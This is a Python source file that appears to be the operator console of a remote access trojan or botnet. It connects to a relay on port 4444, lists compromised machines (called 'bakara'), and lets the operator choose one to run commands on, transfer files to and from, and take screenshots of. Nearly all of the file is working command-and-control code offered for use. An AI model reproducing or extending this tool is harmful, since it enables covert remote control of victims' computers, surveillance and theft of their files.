import socket,json,base64
import time
import datetime

class Listener:
    def __init__(self,ip,port):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.reliable_send("sher")
    
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    
    def reliable_receive(self):
        json_data="" 
        while True:
            try:
                json_data=json_data+self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotely(self,command):
        self.reliable_send(command)
        if command=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    
    def write_file(self,path,content):
        content=base64.b64decode(content)
        with open(path,"wb") as file:
            file.write(content)
            return "[+] Download successful"
    
    def read_file(self, path):
        with open(path, "rb") as file:
            binary_data = file.read()
            return base64.b64encode(binary_data).decode("utf-8")
    
    def control_bakara(self):
        while True:
            print("in loop")
            try:
                command=input(">> ")
                command=command.split(" ")
                if command[0]=="upload":
                    file_content=self.read_file(command[1])
                    command.append(file_content)
                elif command[0]=="change_bakara":
                    self.reliable_send(command)
                    self.run()
                result=self.execute_remotely(command)
                if command[0]=="download":
                    result=self.write_file(command[1],result.encode())
                elif command[0]=="screenshot":
                    current_time=datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
                    result=self.write_file("screenshot"+current_time+".png",result.encode())
                elif command[0]=="exit":
                    break
            except Exception as e:
                result="[-] Error during command execution from server side\n\n" + str(e)
            print(result)
        print("out of loop")
    
    def run(self):
        while True:
            try:
                active_bakare=self.reliable_receive()
                if type(active_bakare)!=list:
                    print(active_bakare)
                else:
                    length=len(active_bakare)
                    print("Choose a bakara to control")
                    for i in range(length):
                        print(str(i+1) + ". " + str(active_bakare[i]))
                    print(active_bakare)
                    while True:
                        try:
                            n=int(input(">> "))-1
                        except:
                            print("[-] Enter a Integer value only")
                            continue
                        if n<=length and n>=0:
                            print(active_bakare[n])
                            self.reliable_send(active_bakare[n])
                            self.control_bakara()
                        else:
                            print("[-] Invalid choice")
            except Exception as e:
                print("[-] Error during command execution from server side\n\n" + str(e))
        

my_listener=Listener("localhost",4444)
my_listener.run()